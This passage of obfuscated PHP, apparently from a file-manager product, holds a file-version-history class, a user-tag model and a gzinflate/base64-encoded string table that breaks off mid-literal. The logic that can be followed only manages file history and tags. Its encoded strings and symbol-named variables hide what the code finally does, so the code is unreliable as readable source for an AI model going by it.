$Ğ¹§Ñû, $Á¡…†»Ï, $¼õÕ¢“ß, $ç¹ÕØ‘–) { $„ŒÁıúÃ =& $_SERVER[öæÛ¿©¿]; if (isset($Ğ¹§Ñû->_data[$„ŒÁıúÃ[1283]]) && $Ğ¹§Ñû->_data[$„ŒÁıúÃ[1283]]) { return; } $ãÍ‹ÀÄø = $Ğ¹§Ñû->getPathOuter($Á¡…†»Ï); $æ¾æãğß = self::parsePath($ãÍ‹ÀÄø); if (!$æ¾æãğß) { return; } self::add($æ¾æãğß); } public static function eventBeforeRename($òĞ«Œ®ñ) { $İ“Š¼Íé =& $_SERVER[öæÛ¿©¿]; $º„Àô¢ñ = self::parsePath($òĞ«Œ®ñ[0]); if (!$º„Àô¢ñ) { return; } $‹û‚ÀÎ‡ = self::checkInHistory($º„Àô¢ñ); if (!$‹û‚ÀÎ‡) { return; } if ($‹û‚ÀÎ‡[$İ“Š¼Íé[33]] == $İ“Š¼Íé[231]) { $Çöƒ¾Éë = self::listData($º„Àô¢ñ); if ($Çöƒ¾Éë && $Çöƒ¾Éë[$İ“Š¼Íé[446]]) { self::moveHistory($º„Àô¢ñ, $òĞ«Œ®ñ[1]); } } else { IO::rename($‹û‚ÀÎ‡[$İ“Š¼Íé[87]], $òĞ«Œ®ñ[1]); } } public static function eventBeforeMove($Ï’òáÅ) { $³¸õ Ï£ =& $_SERVER[öæÛ¿©¿]; $áïıŠíà = self::parsePath($Ï’òáÅ[0]); if (!$áïıŠíà) { return; } $È¡ÉßıÁ = self::parsePath($Ï’òáÅ[1]); if (!$È¡ÉßıÁ) { return; } $Ç¡€¿Û = $Ï’òáÅ[3]; $£úç Ÿ = self::checkInHistory($áïıŠíà); if (!$£úç Ÿ) { return; } $Ú¯¶º¼© = self::pathHistory($È¡ÉßıÁ); if ($£úç Ÿ[$³¸õ Ï£[33]] == $³¸õ Ï£[231]) { $ïïÌ—“ = self::listData($áïıŠíà); $˜‰Ú‘Èø = rtrim($È¡ÉßıÁ, $³¸õ Ï£[8]) . $³¸õ Ï£[8] . ($Ç¡€¿Û ? $Ç¡€¿Û : get_path_this($áïıŠíà)); $ºëÁ¼èÏ = self::listData($˜‰Ú‘Èø); if ($ïïÌ—“ && $ïïÌ—“[$³¸õ Ï£[446]] && $ºëÁ¼èÏ && $ºëÁ¼èÏ[$³¸õ Ï£[446]]) { return self::clear($áïıŠíà); } if ($ïïÌ—“ && $ïïÌ—“[$³¸õ Ï£[446]]) { self::moveHistory($áïıŠíà, $Ç¡€¿Û, $Ú¯¶º¼©); } } else { IO::move($£úç Ÿ[$³¸õ Ï£[87]], $Ú¯¶º¼©, !1, $Ç¡€¿Û); self::clearEmptyFolder(IO::pathFather($£úç Ÿ[$³¸õ Ï£[87]])); } } public static function eventAfterRemove($ô—‡ˆÀ›, $ğö±’ôñ) { $•ãóü© =& $_SERVER[öæÛ¿©¿]; if (!$ğö±’ôñ) { return; } $¨ß­´ø« = self::parsePath($ô—‡ˆÀ›[0]); if (!$¨ß­´ø«) { return; } $©şİñŠô = self::checkInHistory($¨ß­´ø«); if (!$©şİñŠô) { return; } if ($©şİñŠô[$•ãóü©[33]] == $•ãóü©[231]) { $™´ª™… = self::listData($¨ß­´ø«, !1); if ($™´ª™… && $™´ª™…[$•ãóü©[446]]) { self::clear($¨ß­´ø«, !1); } } else { IO::remove($©şİñŠô[$•ãóü©[87]]); self::clearEmptyFolder(IO::pathFather($©şİñŠô[$•ãóü©[87]])); } } private static function checkInHistory($òíµ¡¢—) { $ˆ¯üñÓÔ = self::pathHistory($òíµ¡¢—); if (!IO::exist($ˆ¯üñÓÔ)) { $ˆ¯üñÓÔ .= $_SERVER[öæÛ¿©¿][1364]; } return IO::exist($ˆ¯üñÓÔ) ? IO::info($ˆ¯üñÓÔ) : !1; } private static function parsePath($áƒ¯¦÷ñ) { $ÕÙ«Öß =& $_SERVER[öæÛ¿©¿]; if (!$áƒ¯¦÷ñ) { return !1; } if (isset($GLOBALS[$ÕÙ«Öß[1365]]) && $GLOBALS[$ÕÙ«Öß[1365]]) { return; } $øˆÂãÉ = KodIO::parse($áƒ¯¦÷ñ); $…Å¨”şá = $øˆÂãÉ[$ÕÙ«Öß[33]]; $­Ó’Ó½‰ = !$…Å¨”şá || $…Å¨”şá == KodIO::KOD_IO || $…Å¨”şá == KodIO::KOD_SHARE_ITEM; if (!$­Ó’Ó½‰ || !$øˆÂãÉ[$ÕÙ«Öß[1366]]) { return !1; } if (substr($áƒ¯¦÷ñ, 0, strlen(DATA_PATH . $ÕÙ«Öß[1367])) == DATA_PATH . $ÕÙ«Öß[1367]) { return !1; } if ($…Å¨”şá == KodIO::KOD_SHARE_ITEM) { $Ù¶÷¬ù¿ = IO::init($áƒ¯¦÷ñ); if ($Ù¶÷¬ù¿->pathParse[$ÕÙ«Öß[1279]]) { return self::parsePath($Ù¶÷¬ù¿->pathParse[$ÕÙ«Öß[1279]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ğª¬˜¯ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ÕÙ«Öß[1368]); foreach ($ğª¬˜¯ as $ûºÏ¾åı) { if (!$…Å¨”şá && substr($áƒ¯¦÷ñ, 0, strlen($ûºÏ¾åı)) == $ûºÏ¾åı) { return !1; } } self::log($GLOBALS[$ÕÙ«Öß[1273]] . $ÕÙ«Öß[1369] . $áƒ¯¦÷ñ); return $áƒ¯¦÷ñ; } private static function pathHistory($Ÿç¿·¥ş) { $ç”üÛº¶ =& $_SERVER[öæÛ¿©¿]; $á”Ï ‘± = self::$_historyBase . ltrim(KodIO::clear($Ÿç¿·¥ş), $ç”üÛº¶[8]); $á”Ï ‘± = str_replace(array($ç”üÛº¶[1370]), array($ç”üÛº¶[1371]), $á”Ï ‘±); return $á”Ï ‘±; } public static function log($ò¯˜ò£œ) { } public static function historyCount($®½¢§…ú) { $Ñæˆ´¢Ö =& $_SERVER[öæÛ¿©¿]; $Ñû·“üó = array(); $½‹•˜æî = array(); foreach ($®½¢§…ú as $¢ÉßÑˆ) { $”‰¹çîğ = get_path_father($¢ÉßÑˆ); if (!$½‹•˜æî[$”‰¹çîğ]) { $½‹•˜æî[$”‰¹çîğ] = array(); } $½‹•˜æî[$”‰¹çîğ][] = get_path_this($¢ÉßÑˆ); } foreach ($½‹•˜æî as $”‰¹çîğ => $ëˆ‡‘Ş‰) { $½ƒòœÂ¨ = self::parsePath($”‰¹çîğ); if (!$½ƒòœÂ¨) { continue; } foreach ($ëˆ‡‘Ş‰ as $”Æ¸Âù—) { $ÖÈÚ«â¥ = self::listData(rtrim($½ƒòœÂ¨, $Ñæˆ´¢Ö[8]) . $Ñæˆ´¢Ö[8] . $”Æ¸Âù—, !1); if ($ÖÈÚ«â¥ && $ÖÈÚ«â¥[$Ñæˆ´¢Ö[446]]) { $Ñû·“üó[rtrim($”‰¹çîğ, $Ñæˆ´¢Ö[8]) . $Ñæˆ´¢Ö[8] . $”Æ¸Âù—] = count($ÖÈÚ«â¥[$Ñæˆ´¢Ö[446]]); } } } return $Ñû·“üó; } public static function add($áÎÌİò) { $­ÆÈš€Æ =& $_SERVER[öæÛ¿©¿]; $¶—Í¥—« = self::listData($áÎÌİò); if (!$¶—Í¥—«) { return; } $ÙôÆÏºç = Model($­ÆÈš€Æ[865])->get($­ÆÈš€Æ[1372]); $¬õÑ‘š = intval($GLOBALS[$­ÆÈš€Æ[6]][$­ÆÈš€Æ[92]][$­ÆÈš€Æ[1350]]); $À‘ÀÚœº = $ÙôÆÏºç == $­ÆÈš€Æ[1373] ? min(5, $¬õÑ‘š) : $¬õÑ‘š; if ($¬õÑ‘š <= 0) { return; } $³Ó¯’È = IO::info($áÎÌİò); $¸¶Í±Ñ… = $¶—Í¥—«[$­ÆÈš€Æ[446]]; if ($³Ó¯’È[$­ÆÈš€Æ[79]] == 0) { return; } if ($³Ó¯’È[$­ÆÈš€Æ[79]] >= 1024 * 1024 * 500) { return !1; } $—÷¡Æİ = IO::hashSimple($áÎÌİò); if ($¸¶Í±Ñ… && $¸¶Í±Ñ…[0][$­ÆÈš€Æ[691]] == $—÷¡Æİ) { return !0; } if (array_key_exists($­ÆÈš€Æ[234], $³Ó¯’È) && !$³Ó¯’È[$­ÆÈš€Æ[234]]) { return !1; } $™ô½¬®ú = short_id(time()); $Ğò–‘Š· = array($­ÆÈš€Æ[483] => $™ô½¬®ú, $­ÆÈš€Æ[691] => $—÷¡Æİ, $­ÆÈš€Æ[32] => $³Ó¯’È[$­ÆÈš€Æ[32]] . $­ÆÈš€Æ[10] . date($­ÆÈš€Æ[1374]) . rand_string(1), $­ÆÈš€Æ[79] => $³Ó¯’È[$­ÆÈš€Æ[79]], $­ÆÈš€Æ[537] => USER_ID, $­ÆÈš€Æ[232] => time(), $­ÆÈš€Æ[1375] => $­ÆÈš€Æ[12]); IO::mkdir($¶—Í¥—«[$­ÆÈš€Æ[1376]]); $İğ‰£ä = IO::copy($áÎÌİò, $¶—Í¥—«[$­ÆÈš€Æ[1376]], !1, $Ğò–‘Š·[$­ÆÈš€Æ[32]]); if (!$İğ‰£ä) { self::clearEmptyFolder($¶—Í¥—«[$­ÆÈš€Æ[1376]]); return !1; } array_unshift($¸¶Í±Ñ…, $Ğò–‘Š·); if (count($¸¶Í±Ñ…) > $À‘ÀÚœº) { $ÍÆì¢Ò = array_slice($¸¶Í±Ñ…, $À‘ÀÚœº); foreach ($ÍÆì¢Ò as $¡Á¿”Í¦) { IO::remove($¶—Í¥—«[$­ÆÈš€Æ[1376]] . $¡Á¿”Í¦[$­ÆÈš€Æ[32]]); } $¸¶Í±Ñ… = array_slice($¸¶Í±Ñ…, 0, $À‘ÀÚœº); } return self::saveData($¶—Í¥—«[$­ÆÈš€Æ[1377]], $¸¶Í±Ñ…); } public static function remove($Ô›û¢ö, $ˆÇÑ°ë) { $îÂ‹¬÷ê =& $_SERVER[öæÛ¿©¿]; $°®‰ÄŒÕ = self::listData($Ô›û¢ö); $©ä‡…Öş = array(); if (!$°®‰ÄŒÕ) { return !1; } foreach ($°®‰ÄŒÕ[$îÂ‹¬÷ê[446]] as $ğØÔ¿) { if ($ğØÔ¿[$îÂ‹¬÷ê[483]] == $ˆÇÑ°ë) { IO::remove($°®‰ÄŒÕ[$îÂ‹¬÷ê[1376]] . $ğØÔ¿[$îÂ‹¬÷ê[32]]); continue; } $©ä‡…Öş[] = $ğØÔ¿; } return self::saveData($°®‰ÄŒÕ[$îÂ‹¬÷ê[1377]], $©ä‡…Öş); } public static function clear($¹½Œ¯ƒµ, $³»Ê‡“ˆ = true) { $îÇòÅ¿§ =& $_SERVER[öæÛ¿©¿]; $ÒËæÙÍÎ = self::listData($¹½Œ¯ƒµ, $³»Ê‡“ˆ); if (!$ÒËæÙÍÎ) { return !1; } foreach ($ÒËæÙÍÎ[$îÇòÅ¿§[446]] as $­ÂØé”™) { IO::remove($ÒËæÙÍÎ[$îÇòÅ¿§[1376]] . $­ÂØé”™[$îÇòÅ¿§[32]]); } return self::saveData($ÒËæÙÍÎ[$îÇòÅ¿§[1377]], array()); } public static function moveHistory($Çñ”Íåû, $Ú†ìïø• = '', $ñ­§œ«ä = '') { $ıõüè—Ô =& $_SERVER[öæÛ¿©¿]; $äÍÛúñ = self::listData($Çñ”Íåû, !1); if (!$äÍÛúñ || !$äÍÛúñ[$ıõüè—Ô[446]]) { return !1; } $™Ìœ§°« = $ıõüè—Ô[1364]; $Ú†ìïø• = $Ú†ìïø• ? $Ú†ìïø• : get_path_this($Çñ”Íåû); $ñ­§œ«ä = $ñ­§œ«ä ? $ñ­§œ«ä : $äÍÛúñ[$ıõüè—Ô[1376]]; $§“¤¼Šö = substr(get_path_this($äÍÛúñ[$ıõüè—Ô[1377]]), 0, -strlen($™Ìœ§°«)); foreach ($äÍÛúñ[$ıõüè—Ô[446]] as $Ë÷¹¡Îò => $…¦Åƒ•À) { $ÉàÑÆÓÙ = $Ú†ìïø• . substr($…¦Åƒ•À[$ıõüè—Ô[32]], strlen($§“¤¼Šö)); $î†¯ˆëÎ = IO::move($äÍÛúñ[$ıõüè—Ô[1376]] . $…¦Åƒ•À[$ıõüè—Ô[32]], $ñ­§œ«ä, !1, $ÉàÑÆÓÙ); if ($î†¯ˆëÎ) { $äÍÛúñ[$ıõüè—Ô[446]][$Ë÷¹¡Îò][$ıõüè—Ô[32]] = $ÉàÑÆÓÙ; } } $äÍÛúñ[$ıõüè—Ô[1377]] = IO::move($äÍÛúñ[$ıõüè—Ô[1377]], $ñ­§œ«ä, !1, $Ú†ìïø• . $™Ìœ§°«); self::saveData($äÍÛúñ[$ıõüè—Ô[1377]], $äÍÛúñ[$ıõüè—Ô[446]]); self::clearEmptyFolder($äÍÛúñ[$ıõüè—Ô[1376]]); } public static function rollback($™Ù¯…Ş, $ã¡ƒ’é¬) { $Ã•·”™Š =& $_SERVER[öæÛ¿©¿]; $ŒœæÎ÷¶ = self::listData($™Ù¯…Ş); if (!$ŒœæÎ÷¶) { return; } $Á¯¤î§‰ = IO::info($™Ù¯…Ş); foreach ($ŒœæÎ÷¶[$Ã•·”™Š[446]] as $È °µİ† => $ÀºÃÅóâ) { if ($ÀºÃÅóâ[$Ã•·”™Š[483]] == $ã¡ƒ’é¬) { self::add($™Ù¯…Ş); $ËÆÎ…á¶ = $ŒœæÎ÷¶[$Ã•·”™Š[1376]] . $ÀºÃÅóâ[$Ã•·”™Š[32]]; $±³ÕŸö¿ = IO::copy($ËÆÎ…á¶, IO::pathFather($™Ù¯…Ş), REPEAT_REPLACE, $Á¯¤î§‰[$Ã•·”™Š[32]]); if ($±³ÕŸö¿) { self::remove($™Ù¯…Ş, $ã¡ƒ’é¬); } return $±³ÕŸö¿; } } return !1; } public static function setDetail($âÎ“öà, $ÈŒ³‘¾, $î™Ä·ñÙ) { $ÀÒ¬×À =& $_SERVER[öæÛ¿©¿]; $°«Ìù„ß = self::listData($âÎ“öà); if (!$°«Ìù„ß) { return; } foreach ($°«Ìù„ß[$ÀÒ¬×À[446]] as $Î×Úš¥ó => $‰³ŠÃõ”) { if ($‰³ŠÃõ”[$ÀÒ¬×À[483]] == $ÈŒ³‘¾) { $°«Ìù„ß[$ÀÒ¬×À[446]][$Î×Úš¥ó][$ÀÒ¬×À[1375]] = $î™Ä·ñÙ; self::saveData($°«Ìù„ß[$ÀÒ¬×À[1377]], $°«Ìù„ß[$ÀÒ¬×À[446]]); return !0; } } return !1; } public static function fileInfo($’° ºñâ, $ªºÍ½îš) { $‚é¢¼Ÿ± =& $_SERVER[öæÛ¿©¿]; $ã¹Øã†á = self::listData($’° ºñâ); if (!$ã¹Øã†á) { show_json(LNG($‚é¢¼Ÿ±[106]), !1); } $¾¶¸¨¬Ù = $‚é¢¼Ÿ±[12]; foreach ($ã¹Øã†á[$‚é¢¼Ÿ±[446]] as $²¥ÅŞ·÷ => $Öö©ä¦ì) { if ($Öö©ä¦ì[$‚é¢¼Ÿ±[483]] != $ªºÍ½îš) { continue; } $¾¶¸¨¬Ù = $ã¹Øã†á[$‚é¢¼Ÿ±[1376]] . $Öö©ä¦ì[$‚é¢¼Ÿ±[32]]; break; } if (!$¾¶¸¨¬Ù) { show_json(LNG($‚é¢¼Ÿ±[106]), !1); } return IO::info($¾¶¸¨¬Ù); } public static function fileOut($ÍáÈ’, $Œ®Şçò‡, $Ãåˆ­Ù = false) { $²Ç£Ê¥© =& $_SERVER[öæÛ¿©¿]; $ˆì®•Îü = self::fileInfo($ÍáÈ’, $Œ®Şçò‡); $»¯şş„ï =& $GLOBALS[$²Ç£Ê¥©[7]]; $Ãåˆ­Ù = isset($»¯şş„ï[$²Ç£Ê¥©[1327]]) && $»¯şş„ï[$²Ç£Ê¥©[1327]] == 1; if (isset($»¯şş„ï[$²Ç£Ê¥©[33]]) && $»¯şş„ï[$²Ç£Ê¥©[33]] == $²Ç£Ê¥©[1378]) { return IO::fileOutImage($ˆì®•Îü[$²Ç£Ê¥©[87]], $»¯şş„ï[$²Ç£Ê¥©[1379]]); } IO::fileOut($ˆì®•Îü[$²Ç£Ê¥©[87]], $Ãåˆ­Ù, get_path_this($ÍáÈ’)); } public static function listData($ÎáÚ‡ùõ, $›¿·‰‰ = true) { $‰ÆóÈ =& $_SERVER[öæÛ¿©¿]; if ($›¿·‰‰ && !IO::exist($ÎáÚ‡ùõ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ÎáÚ‡ùõ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $Ï¤İ€ß = self::pathHistory($ÎáÚ‡ùõ); $ë¶œçÏ‚ = array($‰ÆóÈ[1377] => $Ï¤İ€ß . $‰ÆóÈ[1364], $‰ÆóÈ[1376] => rtrim(get_path_father($Ï¤İ€ß), $‰ÆóÈ[8]) . $‰ÆóÈ[8], $‰ÆóÈ[446] => array()); $õ¶ÂÏŸ˜ = IO::getContent($ë¶œçÏ‚[$‰ÆóÈ[1377]]); if ($õ¶ÂÏŸ˜) { $ÙÌ·¯øä = json_decode($õ¶ÂÏŸ˜, !0); if (is_array($ÙÌ·¯øä)) { $ë¶œçÏ‚[$‰ÆóÈ[446]] = $ÙÌ·¯øä; } } return $ë¶œçÏ‚; } private static function saveData($Ç¾á§æ, $ì¤¼‡ ˆ) { $¹ã¡¢îß =& $_SERVER[öæÛ¿©¿]; self::log($¹ã¡¢îß[1380] . $Ç¾á§æ . $¹ã¡¢îß[74] . count($ì¤¼‡ ˆ), $¹ã¡¢îß[844]); if ($ì¤¼‡ ˆ) { return IO::setContent($Ç¾á§æ, json_encode($ì¤¼‡ ˆ)); } $·ŒäÃ³© = IO::pathFather($Ç¾á§æ); IO::remove($Ç¾á§æ); self::clearEmptyFolder($·ŒäÃ³©); return !0; } public static function clearEmptyFolder($–ŒÉõÖ€) { $…©ì†¹ =& $_SERVER[öæÛ¿©¿]; if (trim($–ŒÉõÖ€, $…©ì†¹[8]) == trim(self::$_historyBase, $…©ì†¹[8])) { return; } $è†ºÑÕ = IO::pathFather($–ŒÉõÖ€); $ÎçÌ—ú¤ = IO::has($–ŒÉõÖ€, !0); if ($ÎçÌ—ú¤[$…©ì†¹[240]] > 0 || $ÎçÌ—ú¤[$…©ì†¹[241]] > 0) { return; } IO::remove($–ŒÉõÖ€); self::clearEmptyFolder($è†ºÑÕ); } private static function getBasePath() { $ø”±õÏß =& $_SERVER[öæÛ¿©¿]; $ë·Á¿É¡ = Model($ø”±õÏß[1381])->get($ø”±õÏß[1382]); if ($ë·Á¿É¡) { if (!IO::exist($ë·Á¿É¡)) { IO::mkdir($ë·Á¿É¡); } if (get_path_this($ë·Á¿É¡) == $ø”±õÏß[1367]) { $½¹€ø­“ = $ø”±õÏß[1383] . rand_string(8); @rename($ë·Á¿É¡, get_path_father($ë·Á¿É¡) . $ø”±õÏß[8] . $½¹€ø­“); $ë·Á¿É¡ = DATA_PATH . $½¹€ø­“ . $ø”±õÏß[8]; file_put_contents(DATA_PATH . $ø”±õÏß[1315], $ø”±õÏß[12]); Model($ø”±õÏß[1381])->set($ø”±õÏß[1382], $ë·Á¿É¡); } return $ë·Á¿É¡; } $ë·Á¿É¡ = DATA_PATH . $ø”±õÏß[1383] . rand_string(8) . $ø”±õÏß[8]; $ë·Á¿É¡ = IO::mkdir($ë·Á¿É¡); $ë·Á¿É¡ = rtrim($ë·Á¿É¡, $ø”±õÏß[8]) . $ø”±õÏß[8]; file_put_contents($ë·Á¿É¡ . $ø”±õÏß[1315], $ø”±õÏß[12]); file_put_contents(DATA_PATH . $ø”±õÏß[1315], $ø”±õÏß[12]); Model($ø”±õÏß[1381])->set($ø”±õÏß[1382], $ë·Á¿É¡); return $ë·Á¿É¡; } } goto aùÒÙîòË÷; C‹ì¢’ñ¤÷: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\x72\x2e\x74\141\147\114\x69\163\164"; public $modelType = "\125\163\145\162\117\160\x74\151\157\x6e"; public $field = array("\x6e\x61\155\145", "\163\164\x79\x6c\145", "\163\157\x72\x74"); public function listData($›„Ú¤Ÿ¬ = false, $Îµ¶¹ = "\163\157\x72\x74", $Î§Ã†Å = false) { return parent::listData($›„Ú¤Ÿ¬, $Îµ¶¹, $Î§Ã†Å); } public function remove($ÙÇ‡ãÕĞ) { return parent::remove($ÙÇ‡ãÕĞ); } public function add($Í×åËÉò, $Ğ†Ê¿‹ø = "\154\141\142\x65\x6c\55\x67\x72\x65\171\55\156\x6f\x72\155\x61\154") { $çîèğ«¸ =& $_SERVER[öæÛ¿©¿]; if ($this->findByName($Í×åËÉò)) { return !1; } $ÒˆÈØ­‚ = array($çîèğ«¸[505] => $Í×åËÉò, $çîèğ«¸[570] => $Ğ†Ê¿‹ø, $çîèğ«¸[2135] => $this->getSort($çîèğ«¸[336]) + 1); return parent::insert($ÒˆÈØ­‚); } public function update($Æí­Î”Ö, $õÛ¶«ß–) { $ÙƒêåÍë =& $_SERVER[öæÛ¿©¿]; $œú€§Ã± = $this->listData($Æí­Î”Ö); $ıÅ£¬º¶ = $this->findByName($õÛ¶«ß–[$ÙƒêåÍë[32]]); if (!$œú€§Ã± || $ıÅ£¬º¶ && $ıÅ£¬º¶[$ÙƒêåÍë[483]] != $œú€§Ã±[$ÙƒêåÍë[483]]) { return !1; } return parent::update($Æí­Î”Ö, $õÛ¶«ß–); } public function moveTop($ã •ÚÓ) { $Â¸ù¤ˆ =& $_SERVER[öæÛ¿©¿]; $¤Í¦ÍØ = parent::listData(); $‹·ğíú = $this->getSort($Â¸ù¤ˆ[335]); foreach ($¤Í¦ÍØ as &$×ŒáÖŒ¸) { if ($×ŒáÖŒ¸[$Â¸ù¤ˆ[483]] == $ã •ÚÓ) { $×ŒáÖŒ¸[$Â¸ù¤ˆ[2153]] = $‹·ğíú; continue; } $×ŒáÖŒ¸[$Â¸ù¤ˆ[2153]] += 1; } unset($×ŒáÖŒ¸); return parent::resetData($¤Í¦ÍØ); } public function moveBottom($ÃÆ×¤ÑÄ) { $‹Æ˜èç³ =& $_SERVER[öæÛ¿©¿]; $ÑÜçØ˜Æ = $this->getSort($‹Æ˜èç³[336]) + 1; return parent::update($ÃÆ×¤ÑÄ, array($‹Æ˜èç³[2153] => $ÑÜçØ˜Æ)); } public function resetSort($’ş§­Ÿ¯) { $ü¡¾ßÂË =& $_SERVER[öæÛ¿©¿]; $äõôÏ’ = array(); $’ş§­Ÿ¯ = is_array($’ş§­Ÿ¯) ? $’ş§­Ÿ¯ : array(); for ($İ—ñ¹ÇØ = 0; $İ—ñ¹ÇØ < count($’ş§­Ÿ¯); $İ—ñ¹ÇØ++) { $äõôÏ’[$’ş§­Ÿ¯[$İ—ñ¹ÇØ] . $ü¡¾ßÂË[12]] = $İ—ñ¹ÇØ + 1; } $È‡ì²æú = parent::listData(); foreach ($È‡ì²æú as &$æéá§°ú) { $œâ²î¹Š = $äõôÏ’[$æéá§°ú[$ü¡¾ßÂË[483]]]; $æéá§°ú[$ü¡¾ßÂË[2153]] = $œâ²î¹Š ? $œâ²î¹Š : $æéá§°ú[$ü¡¾ßÂË[2153]]; } unset($æéá§°ú); return parent::resetData($È‡ì²æú); } private function getSort($Ëß÷²ë) { $ÅØªç¯ =& $_SERVER[öæÛ¿©¿]; $Ù´·¥… = parent::listData(); $­¿Á¤ü‚ = array_to_keyvalue($Ù´·¥…, $ÅØªç¯[12], $ÅØªç¯[2153]); if (!$­¿Á¤ü‚) { $­¿Á¤ü‚ = array(0); } $×­Æ÷Œ = $Ëß÷²ë == $ÅØªç¯[336] ? max($­¿Á¤ü‚) : min($­¿Á¤ü‚); return intval($×­Æ÷Œ); } } goto E‘ŒŒ¬¾; f”Ó¡Ñ†¤: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\366\346\333\277\251\277", "\275\264\360\365\225\264"); $_SERVER[öæÛ¿©¿] = explode("\174\1\174\5\174\4", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\xbd\x79\x7c\x5c\x55\xd9\x38\xe\xfa\x2a\x50\x5\x64\x55\xdc\xb8\xa4\xb4\x49\xda\x59\x92\x74\x4f\x9b\xb6\x93\x64\xd2\xc\x9d\x64\xc2\xcc\xa4\xb\x49\xb8\xbd\x99\xb9\x49\xa6\x99"."\231\73\235\173\47\113\27\55\133\53\113\131\244\254\26\1\131\105\151\101\221\262\243\210\202\12\212\257\40\202\12\12\115\332\262\174\101\301\5\171\305\357\131\236\347\234\163\357\114\340\375\175\176\177\174".base64_decode('C+2c/Z7znOc85znPeZ7nvLhz+3NX3bb50M2f2PxfN+674slnn+Jh8t/HyS8Ln3zh4YewP8ddeA==')."\x41\x4d\x4d\xfb\xfc\x69\xb3\x3b\x3f\x7d\xc9\x3d\x77\x1a\xdf\x36\x76\x1b\x3b\x62\xd1\x5f\x3c\x15\x39\xf2\x97\xdf\x3d\x2d\x3c\x79\xd3\x2f\xc6\x27\xf\x3d\x64\xf9\x5\xcb\x52\x8d\xa4\x30\xaf\xdb\xc8\x7f\xb4\xbc\xe5\x68\xe6"."\x58\xc6\x76\x6c\x9e\x90\xb2\xf2\x3\x99\x41\x1e\xce\xe4\xf9\x6f\x90\xff\x74\xc7\xa3\x45\x33\x67\x39\x26\x8f\x6\xf8\x8f\xe\xfd\x62\xff\xda\x1b\xb2\x19\xcc\xd7\x3b\x63\x49\x3d\xd1\xdd\xd5\x15\x8e\x27\xa1\x50\xa3\x9a\x9f"."\xb3\xd2\x10\x2a\x18\x45\x23\x7\xdf\x2f\x98\x45\x9b\xf4\x46\x6d\x4e\x2f\x58\x5\x33\xef\x4a\x91\x9\x69\xc3\x31\xfa\xd\x1b\x5a\x6a\x6d\xd6\x5b\xc3\x5d\xd1\xd8\x5a\x3d\xb9\xb6\x2b\xc\x25\xfa\xf5\xd\x25\xb3\x38\xce\x63"."\54\230\160\214\242\223\314\344\114\121\142\264\50\372\325\34\136\21\351\324\222\361\120\147\42\324\222\214\304\72\171\162\113\254\243\43\222\54\117\217\307\242\321\346\120\313\312\362\234\256\170\150\105\107\110"."\43\375\313\232\172\46\77\140\325\150\353\170\316\72\255\226\7\332\62\146\66\315\203\171\3\273\343\214\27\40\224\24\41\62\115\371\122\66\313\43\235\42\224\66\7\214\122\26\240\325\252\106\12\305\114"."\316\300\101\257\64\307\105\52\17\30\45\307\312\344\123\74\22\36\163\212\206\114\47\175\115\221\211\66\363\320\124\42\34\15\267\44\65\332\101\255\55\36\353\320\140\22\162\206\355\230\105\155\165\173\70".base64_decode('HtZop5uq2VirNcCXTgIKLRSNalO14Ji5AjbD61RoLBZvDce15rWahFDKyuWsfIC0QmbSUboajg==')."\307\171\300\7\350\35\215\320\111\203\110\254\255\55\21\26\61\30\334\351\121\322\223\71\200\237\256\130\172\40\353\350\43\106\266\204\150\72\314\177\253\341\7\176\55\33\120\167\103\46\237\51\1\232\102"."\23\226\45\226\25\4\112\130\332\304\24\63\15\201\34\251\157\101\275\176\110\353\307\122\353\61\220\41\53\164\204\7\233\226\362\337\305\120\277\137\247\171\146\321\321\315\174\312\112\147\362\260\216\227\1"."\76\32\316\120\153\61\103\12\360\370\200\225\115\143\330\316\154\204\121\16\144\262\146\147\51\247\26\21\321\324\120\46\233\56\342\322\373\260\222\74\32\25\53\231\226\225\261\2\351\211\40\2\231\201\161"."\271\24\151\271\56\221\153\133\245\142\312\214\220\245\303\343\365\220\154\72\16\31\34\2\304\352\56\144\55\43\235\60\213\142\150\31\253\215\64\24\53\71\152\342\60\256\202\264\2\204\140\115\317\131\376"."\17\372\172\226\223\177\152\201\320\365\302\147\206\314\154\126\67\307\114\130\46\271\364\74\33\307\27\264\373\63\371\40\111\341\321\110\114\37\62\354\241\216\364\74\235\325\102\372\231\66\307\2\205\241\2"."\xac\x61\xb1\x6c\x7b\x5d\x68\x4c\xa1\xd1\x69\x39\x61\x85\xa\x67\xad\x94\x1\x65\x4b\x6c\x70\x3c\x3c\xe4\x38\x85\x84\x99\x4f\xd3\xc1\xc1\x50\xac\xd1\x3c\x1b\x7c\xc1\x34\xa1\x50\xab\x4f\x4b\x6b\x1d\xda\x5a\xad\xbd\x31\xd3"."\x68\x63\xc5\x5c\x56\x84\x70\x74\x22\xcd\x16\x89\xce\x18\xce\x50\x7a\x0\x10\x10\x37\x81\x2a\xf8\x60\xc6\x66\xf4\x4c\x2e\x46\xa3\x50\xc8\x66\x52\x86\x93\xb1\xf2\x41\x2b\xe5\x98\x8e\xdf\x76\x8a\xa6\x1\x2d\x86\x52\x29\xd3"."\xb6\xfd\x2d\x56\xde\x29\x5a\x59\x7f\x28\x9b\xb5\x46\xfd\xb1\x62\x66\x30\x93\x6f\xd4\x66\x1\x69\x25\x99\x64\x9\xfb\x29\xb9\x6b\x84\x75\x59\xb5\x58\xa3\xb8\x40\x3f\x33\xab\xa9\xe4\xc\xf8\x17\xe2\x7a\x13\xa5\x8b\x46\xde"."\36\60\213\376\60\40\173\243\106\72\53\150\36\26\153\315\330\5\313\316\320\356\65\152\206\343\30\251\41\112\57\144\363\115\37\122\76\223\317\146\362\146\171\131\322\210\351\357\52\32\203\71\243\121\53"."\x94\xfa\x9\x0\x60\x8d\x41\x5a\x8a\x96\x50\xb\x3\x0\x1a\xb5\x9c\x31\xe6\x37\x6\xb1\xa5\xf0\x58\x21\x53\x34\x6d\x1c\xb5\xb6\xa2\x23\x9\x18